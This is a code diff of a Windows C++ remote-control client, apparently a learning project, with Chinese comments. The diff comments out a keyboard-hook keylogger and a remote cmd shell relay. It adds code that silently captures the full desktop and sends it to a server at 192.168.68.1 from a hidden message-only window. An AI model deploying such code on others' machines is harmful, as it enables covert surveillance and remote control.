@@ -12,13 +12,13 @@
 //#include <afx.h>
 //
 //#define _AFXDLL
-
-#ifdef _DEBUG
-#pragma comment(lib,"../../../bin/RemotePc/Debug/KBHook_DLL.lib")
-#else
-#pragma comment(lib,"../../../bin/RemotePc/Release/KBHook_DLL.lib")
-#endif // _DEBUG
-
+//
+//#ifdef _DEBUG
+//#pragma comment(lib,"../../../bin/RemotePc/Debug/KBHook_DLL.lib")
+//#else
+//#pragma comment(lib,"../../../bin/RemotePc/Release/KBHook_DLL.lib")
+//#endif // _DEBUG
+//
 
 
 
@@ -75,7 +75,7 @@ int InitSocket() {
 
 	addr.sin_family = AF_INET;//协议
 	addr.sin_port = htons(Port);
-	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");;//服务端ip地址
+	addr.sin_addr.S_un.S_addr = inet_addr("192.168.68.1");;//服务端ip地址
 	printf("We are trying to connect to %s:%d\n", inet_ntoa(addr.sin_addr), addr.sin_port);
 
 	nRet = connect(s, (SOCKADDR*)&addr, sizeof(addr));
@@ -90,7 +90,7 @@ int InitSocket() {
 
 	printf("Our connection successed.\n");
 
-	send(s,"Hello",sizeof("Hello"),0);
+	//send(s,"Hello",sizeof("Hello"),0);
 
 	return 1;
 }
@@ -234,6 +234,9 @@ int myrecv(SOCKET NewConnection, char* szBuf, int nBytes) {
 
 
 
+
+
+
 // 全局变量:
 HINSTANCE hInst;                                // 当前实例
 WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
@@ -244,6 +247,161 @@ ATOM                MyRegisterClass(HINSTANCE hInstance);
 BOOL                InitInstance(HINSTANCE, int);
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
+
+
+
+//显示桌面数据
+BOOL GetMyCapture(SOCKET s) {
+
+	HWND hDesktopWnd=NULL;
+	HDC hDeskDC= NULL;
+	HDC hMemDC= NULL;
+	HBITMAP hBitMap= NULL;
+	char* pBitMapBuf = NULL;
+	BOOL bResult = TRUE;
+
+	try
+	{
+
+
+		//1.获取桌面的窗口句柄
+		hDesktopWnd = GetDesktopWindow();
+
+		//2.获取桌面DC 类似于画布
+		hDeskDC = GetDC(hDesktopWnd);
+		if (hDeskDC == NULL)
+		{
+			throw "error";
+		}
+
+		/*
+
+		//做个测试在桌面绘制
+		char szText[] = "Hello world";
+		RECT rc;
+		rc.top = 10;
+		rc.bottom = 100;
+		rc.left = 10;
+		rc.right = 100;
+
+		DrawTextA(
+			hDeskDC,          // handle to DC
+			szText, // text to draw
+			strlen(szText)+1,       // text length
+			&rc,    // formatting dimensions
+			DT_LEFT);
+
+
+		*/
+
+
+
+		//3.在内存中创建一个内存DC DC句柄 创建一个兼容DC，相当于我们自己的画布  
+		//（创建一个新的画布，将当前画布内容拷贝过来）
+		hMemDC = CreateCompatibleDC(hDeskDC);
+		if (hMemDC == NULL)
+		{
+			throw "error";
+		}
+		//画笔  画刷 位图
+		//我们需要将我们桌面有关的图片hMemDC中的 位图中
+		//获取当前电脑分辨率
+
+		int nWidth = GetSystemMetrics(SM_CXSCREEN);
+		int nHeight = GetSystemMetrics(SM_CYSCREEN);
+
+		//4.创建与桌面相兼容的位图
+		hBitMap = CreateCompatibleBitmap(hDeskDC, nWidth, nHeight);
+		if (hBitMap == NULL)
+		{
+			throw "error";
+		}
+
+		//5.将我们的内存DC与位图相关联
+		SelectObject(hMemDC, hBitMap);
+
+		//6.将当前桌面DC的具体数据拷贝给我们的内存DC
+
+		BitBlt(hMemDC, // handle to destination DC
+			0,  // x-coord of destination upper-left corner
+			0,  // y-coord of destination upper-left corner
+			nWidth,  // width of destination rectangle
+			nHeight, // height of destination rectangle
+			hDeskDC,  // handle to source DC
+			0,   // x-coordinate of source upper-left corner
+			0,   // y-coordinate of source upper-left corner
+			SRCCOPY  // raster operation code 拷贝模式
+		);
+		if (BitBlt == NULL)
+		{
+			throw "error";
+		}
+
+		//7.从内存DC中获取位图数据
+		int nBufSize = nWidth * nHeight * 4+8;
+		//这里额外增加8字节用于存放宽和高，以便服务端接受
+
+		pBitMapBuf = new char[nBufSize];
+		if (pBitMapBuf == NULL)
+		{
+			throw "error";
+		}
+
+		//将图像的前8个字节用于存放我们长与宽
+		tagScreenData* pScreenData = (tagScreenData*)pBitMapBuf;
+		pScreenData->nWidth = nWidth;
+		pScreenData->nHeight = nHeight;
+
+
+		LONG nBitSize= GetBitmapBits(hBitMap,      // handle to bitmap
+			nBufSize-8,     // number of bytes to copy
+			pBitMapBuf+8     // buffer to receive bits
+		);
+		if (nBitSize == 0)
+		{
+			throw "error";
+		}
+
+		//到这里表示拿到了数据,把数据发送到我们的服务端
+		SendData(s, PACKET_RLY_SCREEN, pBitMapBuf, nBitSize);
+
+	}
+	catch (const std::exception&)
+	{
+		bResult = FALSE;
+	}
+
+	//释放资源
+	if (hDeskDC != NULL)
+	{
+		ReleaseDC(hDesktopWnd, hDeskDC);
+	}
+
+	if (hMemDC != NULL)
+	{
+		DeleteDC(hMemDC);
+	}
+
+	if (hBitMap != NULL)
+	{
+		DeleteObject(hBitMap);
+	}
+
+	if (pBitMapBuf != NULL)
+	{
+		delete[] pBitMapBuf;
+	}
+
+	
+
+	return bResult;
+}
+
+
+
+
+
+
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
@@ -268,13 +426,15 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
     HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_RECLIENTKBHCMD));
 
-
-	nRet = InitCmd();
-	if (!nRet)
-	{
-		printf("InitCmd error");
-		return 0;
-	}
+	
+	
+	
+	//nRet = InitCmd();
+	//if (!nRet)
+	//{
+	//	printf("InitCmd error");
+	//	return 0;
+	//}
 
 	nRet = InitSocket();
 	if (!nRet)
@@ -283,110 +443,190 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 		return 0;
 	}
 
-	SetKbHook();//下键盘钩子
 
-	//开启线程
+
+	//开启线程，显示收到的数据
+
 
 	std::thread thd([&]() {
 		//表示子程序新的起点
+		// 直接收取socket的数据，并显示出来（从客户端cmd里转发过来的）
+		bool bRet = false;
+		char* szRecvBuf = NULL;
 
-
-
-		DWORD nRead;
 		while (TRUE)
 		{
-			
 
-			//读取管道中的数据
-			memset(szBuf, 0, sizeof(szBuf));
-			nRet = ReadFile(
-				m_hInRead,
-				szBuf,
-				4095,
-				&nRead,
-				NULL
-			);
-			if (!nRet)
+			// 先收取包的头部数据
+			DWORD nReadBytes;
+			MyPacket pkt;
+			bRet=RecvData(s, (const char*)&pkt, sizeof(unsigned int) * 2);
+			if (!bRet)
 			{
-				printf("read pipe error");
 				return 0;
 			}
-
-			//读取完成后，通过socket 发送给服务端
-
-			
-			nRet = mySend(s,szBuf, PACKET_REQ_CMD);
-			if (nRet==0)
+				
+			//到这里表示成功收取了头部数据，接下来收取尾部数据
+			if (pkt.length > 0)
 			{
-				printf("mySend error");
-				return 0;
+				//包的数据部分有数据
+
+				szRecvBuf = new char[pkt.length];
+				if (szRecvBuf == NULL)
+				{
+					return 0;
+				}
+
+				bRet=RecvData(s, szRecvBuf, pkt.length);
+				if (!bRet)
+				{
+					return 0;
+				}
+
+
+
 			}
+
+			//到这里表示收取了具体的长度数据，可以开始处理了
+
+			switch (pkt.type )
+			{
+			case PACKET_REQ_SCREEN:
+			{
+				//表示服务端向客户端请求了屏幕数据，我们返回一帧数据
+				GetMyCapture(s);
+			}
+			break;
+
+			default:
+				break;
+			}
+
 
 
 		}
 
 
 
+
+
 		});
 
-	//避免主线程结束，子线程对象被销毁
+	//接触thd与线程回调函数的绑定
 	thd.detach();
 
 
+
+
+
+
+
+
+
+	//SetKbHook();//下键盘钩子
+
 	//开启线程
 
-	std::thread thd1([&]() {
-		//CString str;
-		//recv 收到服务端命令  发送到写管道中去 WriteFile
-
-
-			while (TRUE)
-			{
-				memset(szBuf, 0, sizeof(szBuf));
-				//循环收包，确保收到完整的包
-
-				//先收8字节数据包的头部
-				myrecv(s, szBuf, 8);
-				//再根据头部信息收取后面的字节数
-				//char szPack[4096] = { 0 };
-
-
-				MyPacket* pPkt = (MyPacket*)szBuf;
-
-				//判别类型
-				if (pPkt->type == PACKET_RLY_CMD)
-				{
-					myrecv(s, szBuf, pPkt->length);
-					//::MessageBox(0, szBuf, "szBuf", 0);
-
-					//str += szBuf;
-
-					//SetDlgItemText(IDC_EDT_OUT, str);
-					DWORD nWrite = 0;
-					//返回成功的字节数 
-				
-					nRet = WriteFile(
-						m_hOutWrite,
-						szBuf,
-						nRet,
-						&nWrite,
-						NULL
-					);
-					if (!nRet)
-					{
-						printf("write pipe error");
-						return 0;
-					}
-				}
-
-			}
+	//std::thread thd([&]() {
+	//	//表示子程序新的起点
 
 
 
-	});
+	//	DWORD nRead;
+	//	while (TRUE)
+	//	{
+	//		
 
-	thd1.detach();
-	
+	//		//读取管道中的数据
+	//		memset(szBuf, 0, sizeof(szBuf));
+	//		nRet = ReadFile(
+	//			m_hInRead,
+	//			szBuf,
+	//			4095,
+	//			&nRead,
+	//			NULL
+	//		);
+	//		if (!nRet)
+	//		{
+	//			printf("read pipe error");
+	//			return 0;
+	//		}
+
+	//		//读取完成后，通过socket 发送给服务端
+
+	//		
+	//		nRet = mySend(s,szBuf, PACKET_REQ_CMD);
+	//		if (nRet==0)
+	//		{
+	//			printf("mySend error");
+	//			return 0;
+	//		}
+
+
+	//	}
+
+
+
+	//	});
+
+	////避免主线程结束，子线程对象被销毁
+	//thd.detach();
+
+
+	////开启线程
+
+	//std::thread thd1([&]() {
+	//	//CString str;
+	//	//recv 收到服务端命令  发送到写管道中去 WriteFile
+
+
+	//		while (TRUE)
+	//		{
+	//			memset(szBuf, 0, sizeof(szBuf));
+	//			//循环收包，确保收到完整的包
+
+	//			//先收8字节数据包的头部
+	//			myrecv(s, szBuf, 8);
+	//			//再根据头部信息收取后面的字节数
+	//			//char szPack[4096] = { 0 };
+
+
+	//			MyPacket* pPkt = (MyPacket*)szBuf;
+
+	//			//判别类型
+	//			if (pPkt->type == PACKET_RLY_CMD)
+	//			{
+	//				myrecv(s, szBuf, pPkt->length);
+	//				//::MessageBox(0, szBuf, "szBuf", 0);
+
+	//				//str += szBuf;
+
+	//				//SetDlgItemText(IDC_EDT_OUT, str);
+	//				DWORD nWrite = 0;
+	//				//返回成功的字节数 
+	//			
+	//				nRet = WriteFile(
+	//					m_hOutWrite,
+	//					szBuf,
+	//					nRet,
+	//					&nWrite,
+	//					NULL
+	//				);
+	//				if (!nRet)
+	//				{
+	//					printf("write pipe error");
+	//					return 0;
+	//				}
+	//			}
+
+	//		}
+
+
+
+	//});
+
+	//thd1.detach();
+	//
 
 
 	//MessageBox(0, "准备执行消息循环", "title", 0);
@@ -450,6 +690,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
    hInst = hInstance; // 将实例句柄存储在全局变量中
 
+   //HWND_MESSAGE
    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
       CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, HWND_MESSAGE, nullptr, hInstance, nullptr);
 
@@ -540,6 +781,8 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hWnd, &ps);
             // TODO: 在此处添加使用 hdc 的任何绘图代码...
+			GetMyCapture(s);
+
             EndPaint(hWnd, &ps);
         }
         break;
